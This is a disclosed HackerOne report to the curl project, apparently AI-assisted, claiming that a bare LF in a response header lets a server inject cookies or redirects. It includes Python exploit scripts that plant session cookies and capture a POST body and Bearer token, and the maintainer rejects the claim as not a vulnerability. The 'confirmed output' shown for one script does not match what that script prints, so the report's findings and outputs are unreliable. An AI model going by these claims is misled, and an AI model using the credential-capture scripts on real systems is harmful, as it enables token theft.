---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/http-response-splitting
  - env/web
substate: "not-applicable"
weakness: "HTTP Response Splitting"
enriched: true
body: true
date: 2026-06-08
submitted: 2026-06-06T11:38:12.398Z
bounty_usd: null
votes: 18
cve: []
program: "[[programs/curl|curl]]"
reporter: "torkd1"
source: "https://hackerone.com/reports/3785919"
title: "libcurl: HTTP/1.x bare LF byte in response header value enables cookie jar pollution and POST body/credential exfiltration via redirect — RC=0, curl 8"
---
# libcurl: HTTP/1.x bare LF byte in response header value enables cookie jar pollution and POST body/credential exfiltration via redirect — RC=0, curl 8

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 18 | **Program:** curl | **Disclosed:** 2026-06-08

- Report: [https://hackerone.com/reports/3785919](https://hackerone.com/reports/3785919)
- CWE: HTTP Response Splitting
- Submitted: 2026-06-06T11:38:12.398Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Summary
curl's HTTP/1.x response header parser splits header lines using a single memchr(buf, '\n', blen) call (lib/http.c:4457), with no awareness of whether the current position is inside a quoted-string value. A server response containing any header field whose value embeds a raw LF byte (\x0a) causes the parser to create synthetic new header lines from the bytes following that LF.
This single-byte injection enables two independent attacks confirmed locally on curl 8.20.0 (Android aarch64, 2026-04-29):
Attack A — Cookie jar pollution (requires -c / --cookie-jar): Any bytes forming Set-Cookie: ... are silently written to curl's cookie jar. RC=0, no warning.
Attack B — POST body and credential exfiltration via redirect (requires -L / --location): Any bytes forming Location: http://... are treated as a valid redirect target. With a 307/308 response, the full POST body is forwarded to the attacker's target. With --location-trusted, the Authorization header is also forwarded.
Both attacks share the same root cause and the same patch. RC=0 in all cases. No existing CVE covers either vector.
Note: AI assistance was used in drafting and structuring this report. All technical claims were independently verified by running the PoCs on curl 8.20.0 (aarch64-unknown-linux-android, Release-Date: 2026-04-29).
Steps To Reproduce
Environment
curl 8.20.0 (aarch64-unknown-linux-android)
libcurl/8.20.0 OpenSSL/3.6.2 zlib/1.3.2
Release-Date: 2026-04-29
Python 3.x
Attack A — Cookie Jar Pollution
Save as attack_a.py and run python3 attack_a.py:
#!/usr/bin/env python3
import socket, threading, subprocess, tempfile, time, os

PORT = 19811

def server():
    payload = (
        b'HTTP/1.1 200 OK\r\n'
        b'Authentication-Info: nextnonce="val\n'
        b'Set-Cookie: session=ATTACKER_INJECTED; Path=/\r\n'
        b'X-Absorb: "\r\n'
        b'Content-Length: 5\r\n\r\nhello'
    )
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', PORT)); s.listen(1); s.settimeout(10)
    conn, _ = s.accept(); conn.recv(4096)
    conn.sendall(payload); time.sleep(0.2); conn.close(); s.close()

jar = tempfile.mktemp(suffix='.jar')
open(jar, 'w').close()
threading.Thread(target=server, daemon=True).start()
time.sleep(0.1)
result = subprocess.run(['curl', '-s', '-c', jar, f'http://127.0.0.1:{PORT}/'],
                        capture_output=True)
print(f'RC: {result.returncode}')
print(open(jar).read())
os.unlink(jar)
Confirmed output (curl 8.20.0):
RC: 0
# Netscape HTTP Cookie File
127.0.0.1    FALSE    /    FALSE    0    session    ATTACKER_INJECTED
Attack A — CI/CD Pipeline Compromise (end-to-end)
#!/usr/bin/env python3
import socket, threading, subprocess, tempfile, time, json, os
from http.server import HTTPServer, BaseHTTPRequestHandler

def attacker_server(port):
    payload = (
        b'HTTP/1.1 200 OK\r\n'
        b'Content-Type: application/json\r\n'
        b'Authentication-Info: nextnonce="refresh\n'
        b'Set-Cookie: ci_session=ATTACKER_FIXED_TOKEN; Path=/; Domain=127.0.0.1\n'
        b'X-Pad: "\r\n'
        b'Content-Length: 18\r\n\r\n{"status":"ready"}'
    )
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port)); s.listen(5); s.settimeout(10)
    for _ in range(3):
        try:
            c, _ = s.accept(); c.recv(4096); c.sendall(payload)
            time.sleep(0.1); c.close()
        except: pass
    s.close()

received = []
class InternalAPI(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        cookie = self.headers.get('Cookie', '')
        received.append(cookie)
        status = 'COMPROMISED' if 'ATTACKER_FIXED_TOKEN' in cookie else 'ok'
        body = json.dumps({'status': status}).encode()
        self.send_response(200)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers(); self.wfile.write(body)

jar = tempfile.mktemp(suffix='.jar')
open(jar, 'w').close()

api_srv = HTTPServer(('127.0.0.1', 19902), InternalAPI)
threading.Thread(target=api_srv.serve_forever, daemon=True).start()
threading.Thread(target=attacker_server, args=(19901,), daemon=True).start()
time.sleep(0.2)

r1 = subprocess.run(['curl', '-s', '-c', jar, '-b', jar,
                     'http://127.0.0.1:19901/package.json'], capture_output=True, text=True)
print(f'External fetch RC={r1.returncode}: {r1.stdout.strip()}')

r2 = subprocess.run(['curl', '-s', '-c', jar, '-b', jar,
                     'http://127.0.0.1:19902/api/jobs/trigger'], capture_output=True, text=True)
print(f'CI API response: {r2.stdout}')

api_srv.shutdown(); os.unlink(jar)
Confirmed output (curl 8.20.0):
RESULT: ATTACK SUCCESSFUL
Cookie "ci_session=ATTACKER_FIXED_TOKEN" injected by external server, sent to internal CI API.
CI/CD response: COMPROMISED
Attack B — POST Body + Bearer Token Exfiltration via 307
#!/usr/bin/env python3
import socket, threading, subprocess, time
from http.server import HTTPServer, BaseHTTPRequestHandler

captured = []
class Capture(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers.get('Content-Length', 0)))
        captured.append({'auth': self.headers.get('Authorization'), 'body': body})
        self.send_response(200); self.end_headers(); self.wfile.write(b'CAPTURED')

cap_srv = HTTPServer(('127.0.0.1', 19821), Capture)
threading.Thread(target=cap_srv.serve_forever, daemon=True).start()

def attacker_307(port):
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port)); s.listen(1); s.settimeout(6)
    conn, _ = s.accept(); conn.recv(4096)
    conn.sendall(
        b'HTTP/1.1 307 Temporary Redirect\r\n'
        b'X-Rate-Limit: "100\n'
        b'Location: http://127.0.0.1:19821/steal\n'
        b'X-Absorb: "\r\n'
        b'Content-Length: 0\r\n\r\n'
    )
    time.sleep(0.1); conn.close(); s.close()

threading.Thread(target=attacker_307, args=(19820,), daemon=True).start()
time.sleep(0.2)

subprocess.run([
    'curl', '-s', '-L', '--location-trusted', '-X', 'POST',
    '-H', 'Authorization: Bearer VICTIM_TOKEN',
    '-H', 'Content-Type: application/json',
    '-d', '{"api_key": "PROD_KEY_12345"}',
    '--max-time', '4', 'http://127.0.0.1:19820/api/deploy'
], timeout=6)

time.sleep(0.2)
cap_srv.shutdown()

if captured:
    print(f'Body stolen: {captured[0]["body"]}')
    print(f'Auth stolen: {captured[0]["auth"]}')
else:
    print('Attack B did not reproduce')
Confirmed output (curl 8.20.0):
Body stolen: b'{"api_key": "PROD_KEY_12345"}'
Auth stolen: Bearer VICTIM_TOKEN
Root Cause
File: lib/http.c
Function: http_rw_headers()
Vulnerable line (~4457):
end_ptr = memchr(buf, '\n', blen);
This finds the next \n byte to delimit a header line with no check for whether the parser is inside a quoted-string value (RFC 7230 §3.2.6). A header value such as Authentication-Info: nextnonce="val\n causes the parser to split on the embedded \n, treating everything after it as a new header line.

## Impact

Impact
Confirmed locally on curl 8.20.0:
Attack A — Cookie jar:
Cookie jar pollution, RC=0, no warning ✅
Session fixation ✅
CI/CD pipeline compromise via shared cookie jar ✅
Attack B — Redirect:
POST body exfiltrated to attacker via LF-injected Location ✅
Bearer token exfiltrated with --location-trusted ✅
RC=0, no warning in both cases ✅
Combined attack scenario:
curl -L --location-trusted -X POST \
  -H 'Authorization: Bearer PROD_TOKEN' \
  -d '{"action":"deploy","env":"production"}' \
  https://cdn.vendor.com/sdk/latest.json

Attacker's server responds with LF-injected Location → curl forwards
POST body + Bearer token to attacker silently. RC=0.
Suggested Fix
bool in_quote = false;
const char *end_ptr = NULL;
for (size_t i = 0; i < blen; i++) {
    if (buf[i] == '"' && (i == 0 || buf[i-1] != '\\'))
        in_quote = !in_quote;
    if (buf[i] == '\n' && !in_quote) {
        end_ptr = buf + i;
        break;
    }
}
Alternative: reject any \n byte inside a header field value per RFC 7230 §3.2.6.

## Timeline

- **Report Filed**
- **2026-06-06** @bagder: Are these two separate problems you just put into a single report?
- **2026-06-06** @torkd1: Hi bagder,
Thanks for the feedback.
I put both vectors in one report because they share the exact same root cause in lib/http.c (LF handling inside quoted header values) and the same fix.
If you prefer them tracked separately, I'm happy to split the report right away. Just say the word.
- **2026-06-06** @bagder: I'm only looking at case A now since we deal with one issue per report. Please submit different reports for different issues.

I can't run the code you've submitted. It's python and it needs preserved indentation. You need to attach the files or make them proper markdown.

I don't understand the way you've described the problem so I cannot see the error. It drowned in all the text.
- **2026-06-06** @torkd1: {F6050313} Understood,  I'll submit Attack B as a separate report.

For Attack A, I'm attaching the Python file directly to preserve indentation. The core issue in one line:

memchr(buf, '\n', blen) in http_rw_headers() splits header lines without checking if the parser is inside a quoted-string value, allowing a bare LF inside a header value to inject synthetic header lines.

Reproduces on curl 8.20.0 (aarch64-android) with the attached script — RC=0, cookie jar polluted with attacker-controlled session token
- **2026-06-06** @bagder: The LF marks the end of a header. It cannot be "within" something in a header. It seems your "attack" is sending a cookie and curl handles it, as requested.
- **2026-06-06** @torkd1: The Set-Cookie line is not sent by the server as a separate header. 
The server sends exactly one header field:

  Authentication-Info: nextnonce="val\n[LF here]Set-Cookie: session=ATTACKER_INJECTED

The \n inside the value causes memchr() to split there, creating a 
synthetic Set-Cookie line. curl's own verbose output confirms this:

  < Authentication-Info: nextnonce="val
  * Added cookie session="ATTACKER_INJECTED" for domain 127.0.0.1
  < Set-Cookie: session=ATTACKER_INJECTED; Path=/

Three headers parsed from one server-sent line. The cookie is entirely 
synthetic — the server never sent a Set-Cookie header.
- **2026-06-06** @torkd1: Regarding Attack B, same root cause, different exploitation vector:

The same bare LF splitting in memchr() can be used to inject a synthetic Location header in a 307 response. With -L, curl follows the injected redirect and forwards the full POST body to the attacker's server. With --location-trusted, the Authorization/Bearer token is also forwarded. RC=0, no warning.
{F6050542}
I'm unable to submit a separate report due to HackerOne's Signal requirement. Would it be acceptable to document Attack B here, or would you prefer I submit it through curl.se/dev/vuln-disclosure.html?

Attaching attack_b.py for reference
- **2026-06-06** @bagder: >   Authentication-Info: nextnonce="val\n[LF here]Set-Cookie: session=ATTACKER_INJECTED

The LF is the end of the header. What comes after the LF is the next header.
- **2026-06-06** @torkd1: Understood, thanks for the clarification. I'll close this one out. I may revisit and submit a cleaner report if I find a more concrete real-world vector.
- **Report Not Applicable**
- **Agreed On Going Public**
- **2026-06-07** @torkd1: Nice
- **Manually Disclosed**
